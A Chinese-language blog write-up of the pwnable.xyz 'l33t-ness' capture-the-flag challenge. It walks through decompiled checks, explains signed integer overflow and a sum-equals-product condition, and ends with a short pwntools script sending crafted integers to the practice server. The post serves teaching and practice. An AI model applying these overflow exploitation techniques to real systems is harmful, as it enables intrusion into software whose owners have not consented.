---
title: pwnable_I33t_ness
date: 2019-12-25 08:25:34
tags: 
- pwn
- pwnable.xyz
---

# pwnable.xyz I33t-ness

### 0x1 分析

老样子，看一下安全选项：

![](https://i.loli.net/2019/12/25/qAzb9dXECJkvjMg.png)

看样子不好用其他手段了。

分析一下函数吧。

`main()`：

``` c
// local variable allocation has failed, the output may be wrong!
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setup(*(_QWORD *)&argc, argv, envp);
  puts("The l33t-ness level.");
  if ( (unsigned __int8)round_1("The l33t-ness level.") && (unsigned __int8)round_2() && (unsigned __int8)round_3() )
    win();
  return 0;
}
```

从这里看得出来。只要满足三个函数`round_1` `round_2` `round_3`返回值不为0就可以调用`win`了。

那就看看这三个函数吧。

`round_1`:

```c
_BOOL8 round_1()
{
  _BOOL8 result; // rax
  int v1; // [rsp+8h] [rbp-38h]
  int v2; // [rsp+Ch] [rbp-34h]
  char s; // [rsp+10h] [rbp-30h]
  __int64 v4; // [rsp+20h] [rbp-20h]
  unsigned __int64 v5; // [rsp+38h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  puts("=== 1eet ===");
  memset(&s, 0, 0x20uLL);
  printf("x: ", 0LL);
  read(0, &s, 0x10uLL);
  printf("y: ", &s);
  read(0, &v4, 0x10uLL);
  if ( strchr(&s, 45) || strchr((const char *)&v4, 45) )
    return 0LL;
  v1 = atoi(&s);
  v2 = atoi((const char *)&v4);
  if ( v1 <= 1336 && v2 <= 1336 )
    result = v1 - v2 == 1337;
  else
    result = 0LL;
  return result;
}
```

要求我们输入两个值`s` `v4` ，并且都不为负数。满足大小范围的情况下相减得`1337`,那么很容易想到`int`的溢出。

`round_2`：

```c
_BOOL8 round_2()
{
  int v1; // [rsp+0h] [rbp-10h]
  int v2; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v3; // [rsp+8h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  puts("=== t00leet ===");
  v1 = 0;
  v2 = 0;
  _isoc99_scanf("%d %d", &v1, &v2);
  return v1 > 1 && v2 > 1337 && v1 * v2 == 1337;
}
```

这个和上一个的函数情况差不多。还是让`v1` 和`v2`相乘溢出为`1337`。

`round_3`：

```c
_BOOL8 round_3()
{
  signed int i; // [rsp+0h] [rbp-30h]
  __int64 v2; // [rsp+10h] [rbp-20h]
  __int64 v3; // [rsp+18h] [rbp-18h]
  int v4; // [rsp+20h] [rbp-10h]
  unsigned __int64 v5; // [rsp+28h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  puts("=== 3leet ===");
  v2 = 0LL;
  v3 = 0LL;
  v4 = 0;
  _isoc99_scanf("%d %d %d %d %d", &v2, (char *)&v2 + 4);
  for ( i = 1; i <= 4; ++i )
  {
    if ( *((_DWORD *)&v2 + i) < *((_DWORD *)&v2 + i - 1) )
      return 0LL;
  }
  return HIDWORD(v3) + (_DWORD)v3 + HIDWORD(v2) + (_DWORD)v2 + v4 == HIDWORD(v3)
                                                              * (_DWORD)v3
                                                                   * HIDWORD(v2)
                                                                   * (_DWORD)v2
                                                                   * v4;
}
```

这个看起来满足条件有点麻烦。但是其实也不麻烦。

这了IDA pro 反编译出来的输入函数有点不大对。所以看一下源码。

```assembly
lea     rax, [rbp+var_20]
lea     rdi, [rax+10h]
lea     rax, [rbp+var_20]
lea     rsi, [rax+0Ch]
lea     rax, [rbp+var_20]
lea     rcx, [rax+8]
lea     rax, [rbp+var_20]
lea     rdx, [rax+4]
lea     rax, [rbp+var_20]
mov     r9, rdi
mov     r8, rsi
mov     rsi, rax
lea     rdi, aDDDDD     ; "%d %d %d %d %d"
mov     eax, 0
call    __isoc99_scanf
```

可以看出来。在这里输入了`5`个数给了五个位置。每个数占`4`个字节。

这样也正好对应了`return`里面的式子。

这里有个注意的地方：

`HIDWORD`取变量的高位`4`字节

`LODWORD`取变量的地位`4`字节

`_DWORD`取`4`字节。

```c
#define HIDWORD(l) ((DWORD)(((DWORDLONG)(l)>>32)&0xFFFFFFFF))
#define LODWORD(x)  (*((_DWORD*)&(x)))
```

举个🌰：

`x = 0xFFFFFFFFAAAAAAAA`  

`LODWORD（x）`是 `0xAAAAAAAA` 

`HIDWORD（x）`是 `0xFFFFFFFF`

### 思路

这里思路就已经出来。前两个函数输入两个整形溢出即可，

最后一个函数输入满足表达式的`5`个整形即可。

### 代码

```python
from pwn import *

p = remote("svc.pwnable.xyz", 30008)

p.readuntil("x: ")
p.sendline("1")
p.readuntil("y: ")
p.sendline("4294965960")

p.readuntil("=\n")
p.sendline("3 1431656211")

p.readuntil("=\n")
p.sendline("-2 -1 0 1 2")

p.interactive()
```

